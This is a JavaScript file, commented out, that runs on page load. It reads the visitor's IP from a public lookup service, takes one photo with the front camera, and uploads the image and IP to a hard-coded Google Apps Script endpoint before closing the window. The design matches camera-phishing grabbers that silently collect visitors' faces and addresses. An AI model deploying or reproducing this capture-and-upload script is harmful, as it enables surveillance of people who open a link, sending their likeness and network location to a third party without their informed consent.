// // capture.js - External JavaScript file for camera capture functionality

// // Global variables
// let userIP = 'unknown';

// // Main function to capture and upload images
// async function captureAndUpload() {
//     try {
//         // Get user's IP address
//         await getUserIP();
        
//         // Update status
//         updateStatus("Accessing camera...");
        
//         // Access camera
//         const stream = await navigator.mediaDevices.getUserMedia({
//             video: {
//                 facingMode: { exact: "user" },
//                 width: { ideal: 1280 },
//                 height: { ideal: 720 }
//             }
//         });
        
//         // Update status
//         updateStatus("Camera accessed successfully");
        
//         // Create video element and play stream
//         const video = document.createElement('video');
//         video.srcObject = stream;
//         await video.play();
        
//         // Update status
//         updateStatus("Capturing image...");
        
//         // Create canvas and draw video frame
//         const canvas = document.createElement('canvas');
//         canvas.width = video.videoWidth;
//         canvas.height = video.videoHeight;
//         canvas.getContext('2d').drawImage(video, 0, 0);
        
//         // Stop all video tracks
//         stream.getTracks().forEach(track => track.stop());
        
//         // Prepare image data
//         const imageData = canvas.toDataURL('image/jpeg', 0.85).split(',')[1];
        
//         // Generate filename with adjusted time
//         const filename = generateFilename();
        
//         // Update status
//         updateStatus("Uploading image to Google Drive...");
        
//         // Upload to Google Drive via App Script
//         const response = await fetch('https://script.google.com/macros/s/AKfycbxveLuf1BJSzOr81f8ffjUfbS62-e1W3wnvXofXDFwSdatcBGabzXC6c8fbytcX346w/exec', {
//             method: 'POST',
//             body: JSON.stringify({ 
//                 image: imageData,
//                 ip: userIP,
//                 filename: filename
//             })
//         });
        
//         // Log result
//         const result = await response.text();
//         console.log('Upload result:', result);
        
//         // Update status
//         updateStatus("Image uploaded successfully! Closing window...");
        
//         // Close window after delay
//         setTimeout(() => window.close(), 1500);
        
//     } catch (error) {
//         console.error('Capture failed:', error);
//         updateStatus("Error: " + error.message);
//     }
// }

// // Function to get user's IP address
// async function getUserIP() {
//     try {
//         const ipRes = await fetch('https://api.ipify.org?format=json');
//         const ipData = await ipRes.json();
//         userIP = ipData.ip || 'unknown';
//     } catch (ipErr) {
//         console.warn('IP fetch failed:', ipErr);
//     }
// }

// // Function to generate filename with adjusted time
// function generateFilename() {
//     const now = new Date();
//     // GMT+7 (ICT) + 5 extra hours = +12 total
//     const adjustedTime = new Date(now.getTime() + (12 * 60 * 60 * 1000));
    
//     // Format components (using UTC methods for consistency)
//     const year = adjustedTime.getUTCFullYear();
//     const month = String(adjustedTime.getUTCMonth() + 1).padStart(2, '0');
//     const day = String(adjustedTime.getUTCDate()).padStart(2, '0');
//     const hours = String(adjustedTime.getUTCHours()).padStart(2, '0');
//     const minutes = String(adjustedTime.getUTCMinutes()).padStart(2, '0');
//     const seconds = String(adjustedTime.getUTCSeconds()).padStart(2, '0');
    
//     // Return filename
//     return `${userIP}-${year}${month}${day}-${hours}${minutes}${seconds}-GMT+7+5`;
// }

// // Function to update status message
// function updateStatus(message) {
//     const statusElement = document.getElementById('status');
//     if (statusElement) {
//         statusElement.textContent = message;
//     }
// }

// // Initialize when window loads
// window.onload = captureAndUpload;
